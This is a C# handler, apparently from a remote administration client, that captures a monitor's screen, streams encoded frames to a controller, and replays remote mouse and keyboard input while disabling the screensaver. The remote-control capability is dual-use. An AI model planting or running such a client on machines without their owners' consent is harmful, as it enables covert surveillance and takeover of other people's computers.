using Client.Helper;
using Client.Networking.Packets.RemoteDesktop;
using Common.Enums;
using Common.Helper;
using Common.Video;
using Common.Video.Codecs;
using System.Drawing.Imaging;

namespace Client.Networking.Handlers
{
    public class RemoteDesktopHandler : IDisposable
    {
        private readonly Client _client;

        private UnsafeStreamCodec _streamCodec;

        public RemoteDesktopHandler(Client client)
        {
            _client = client;
        }

        public async Task GetDesktop(GetDesktopPacket packet)
        {
            var monitorBounds = ScreenHelper.GetBounds((packet.DisplayIndex));
            var resolution = new Resolution { Height = monitorBounds.Height, Width = monitorBounds.Width };
            if (_streamCodec == null)
                _streamCodec = new UnsafeStreamCodec(packet.Quality, packet.DisplayIndex, resolution);

            if (packet.CreateNew)
            {
                _streamCodec?.Dispose();
                _streamCodec = new UnsafeStreamCodec(packet.Quality, packet.DisplayIndex, resolution);
            }
            if (_streamCodec.ImageQuality != packet.Quality || _streamCodec.Monitor != packet.DisplayIndex || _streamCodec.Resolution != resolution)
            {
                _streamCodec?.Dispose();
                _streamCodec = new UnsafeStreamCodec(packet.Quality, packet.DisplayIndex, resolution);
            }

            BitmapData desktopData = null;
            Bitmap desktop = null;
            try
            {
                desktop = ScreenHelper.CaptureScreen(packet.DisplayIndex);
                desktopData = desktop.LockBits(new Rectangle(0, 0, desktop.Width, desktop.Height),
                    ImageLockMode.ReadWrite, desktop.PixelFormat);

                using (MemoryStream stream = new MemoryStream())
                {
                    if (_streamCodec == null) throw new Exception("StreamCodec can not be null.");
                    _streamCodec.CodeImage(desktopData.Scan0,
                        new Rectangle(0, 0, desktop.Width, desktop.Height),
                        new Size(desktop.Width, desktop.Height),
                        desktop.PixelFormat, stream);
                    Thread.Sleep(10);
                    _client.SendPacket(new GetDesktopPacket
                    {
                        Image = stream.ToArray(),
                        Quality = _streamCodec.ImageQuality,
                        Monitor = _streamCodec.Monitor,
                        Resolution = _streamCodec.Resolution
                    });
                }
            }
            catch (Exception)
            {
                if (_streamCodec != null)
                {
                    _client.SendPacket(new GetDesktopPacket
                    {
                        Image = [],
                        Quality = _streamCodec.ImageQuality,
                        Monitor = _streamCodec.Monitor,
                        Resolution = _streamCodec.Resolution
                    });
                }

                _streamCodec = null;
            }
            finally
            {
                if (desktop != null)
                {
                    if (desktopData != null)
                    {
                        try
                        {
                            desktop.UnlockBits(desktopData);
                        }
                        catch
                        {
                        }
                    }
                    desktop.Dispose();
                }
            }
        }

        public async Task GetMonitors()
        {
            _ = _client.QueuePacketAsync(new GetMonitorsPacket { Number = Screen.AllScreens.Length });
        }

        public async Task MouseEvent(MouseEventPacket packet)
        {
            try
            {
                Screen[] allScreens = Screen.AllScreens;
                int offsetX = allScreens[packet.MonitorIndex].Bounds.X;
                int offsetY = allScreens[packet.MonitorIndex].Bounds.Y;
                Point p = new Point(packet.X + offsetX, packet.Y + offsetY);

                // Disable screensaver if active before input
                switch (packet.Action)
                {
                    case MouseAction.LeftDown:
                    case MouseAction.LeftUp:
                    case MouseAction.RightDown:
                    case MouseAction.RightUp:
                    case MouseAction.MoveCursor:
                        if (NativeMethodsHelper.IsScreensaverActive())
                            NativeMethodsHelper.DisableScreensaver();
                        break;
                }

                switch (packet.Action)
                {
                    case MouseAction.LeftDown:
                    case MouseAction.LeftUp:
                        NativeMethodsHelper.DoMouseLeftClick(p, packet.IsMouseDown);
                        break;
                    case MouseAction.RightDown:
                    case MouseAction.RightUp:
                        NativeMethodsHelper.DoMouseRightClick(p, packet.IsMouseDown);
                        break;
                    case MouseAction.MoveCursor:
                        NativeMethodsHelper.DoMouseMove(p);
                        break;
                    case MouseAction.ScrollDown:
                        NativeMethodsHelper.DoMouseScroll(p, true);
                        break;
                    case MouseAction.ScrollUp:
                        NativeMethodsHelper.DoMouseScroll(p, false);
                        break;
                }
            }
            catch
            {
            }
        }

        public async Task KeyboardEvent(KeyboardEventPacket packet)
        {
            if (NativeMethodsHelper.IsScreensaverActive())
                NativeMethodsHelper.DisableScreensaver();

            NativeMethodsHelper.DoKeyPress(packet.Key, packet.KeyDown);
        }

        public void Dispose()
        {
            GC.SuppressFinalize(this);
        }
    }
}
